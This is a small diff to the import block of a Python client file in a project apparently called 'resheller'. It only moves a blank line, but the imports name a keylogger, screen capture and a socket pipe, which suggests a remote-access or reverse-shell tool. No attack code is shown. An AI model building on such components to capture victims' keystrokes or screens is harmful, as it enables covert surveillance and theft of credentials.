@@ -10,8 +10,8 @@ from time import sleep
 
 from mss import mss
 from requests import get
-
 from resheller.src.client.ip import get_ip
+
 from resheller.src.client.keylogger import KeyLogger
 from resheller.src.server.pipe import SafeSocket
 from resheller.src.stdout.output import usage
